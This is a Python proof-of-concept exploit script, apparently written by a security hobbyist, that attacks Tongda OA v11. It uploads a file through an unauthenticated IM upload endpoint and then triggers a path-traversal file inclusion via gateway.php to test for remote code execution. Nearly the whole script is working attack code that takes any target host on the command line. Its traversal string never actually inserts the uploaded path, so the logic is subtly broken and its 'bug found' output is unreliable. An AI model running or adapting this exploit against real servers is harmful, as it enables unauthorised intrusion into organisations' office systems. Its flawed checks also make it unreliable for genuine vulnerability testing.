#!/usr/bin/python
#coding:utf-8

import argparse
from colorama import *
import requests

"""
					本poc用以验证通达OA的RCE代码执行漏洞，本代码贴合通达v11版本。

					部分版本由于路径不同，如果想要正常运行须要修改代码中路径信息，
	
					在这些需要修改的地方会做出标记，望注意！
"""

init(autoreset=True)
def doc():
	"""@author 风起 QQ:1402720815"""
	"""要是妹子发现这条注释就加我啊╰(●’◡’●)╮"""
	pass

def banner():
	print("\033[0;32;40m\t\t\t\tTongda RCE POC\033[0m")
	print("  __                            .___                              ")
	print("_/  |_  ____   ____    ____   __| _/____    ______   ____   ____  ")
	print("\   __\/  _ \ /    \  / ___\ / __ |\__  \   \____ \ /  _ \_/ ___\ ")
	print(" |  | (  <_> )   |  \/ /_/  > /_/ | / __ \_ |  |_> >  <_> )  \___ "+"\033[0;36;40m\t大风起兮云飞扬\033[0m")
	print(" |__|  \____/|___|  /\___  /\____ |(____  / |   __/ \____/ \___  >")
	print("                  \//_____/      \/     \/  |__|               \/ ")
	print("\033[0;33;40m\t\t\t\t我只是一个POC\033[0m")
	print("\n")

	print("用法:")
	print("	--help:帮助文档")
	print("	-H:目标域名 (-h http://127.0.0.1)")

def verify(host):
	try:
		pdata={"UPLOAD_MODE":1,"P":1,"DEST_UID":1}
		files = {"ATTACHMENT": "hello","filename":"jpg"}
		r = requests.post(host+"/ispirit/im/upload.php",data=pdata,files=files)	#路径修改处
		path = r.text
		path = path[path.find('@')+1:path.rfind('|')].replace("_","/").replace("|",".")
		if path is not None:
			jsons=json={"url":"/general/../../attach/im/'+path+'"}
			include=requests.post(url=host+"/ispirit/interface/gateway.php",data=jsons)
			print(include.text)
			if include.status_code is 200:
				print(Fore.RED+'There is a bug in the system!')		
	except:
		print(Fore.GREEN+'There are no holes in the system!')
		pass
def main():
	try:
		banner()
		parser = argparse.ArgumentParser()
		parser.add_argument("-H","--host", help="目标域名")
		print("\n")
		args = parser.parse_args()
		if(args.host==None):
			print("\033[41m域名不能为空!")
			exit(0)
		host=args.host
		HttpError=args.host.find("http://")
		if HttpError is -1:
			print("\033[41m默认使用http协议如需指定https协议请在url前手动指定。")
			host="http://"+args.host
		
		verify(host)
	except(Exception) as e:
		print(e)
		print("\033[41m请检查语法是否存在错误!")
		pass	

if __name__=="__main__":
	main()
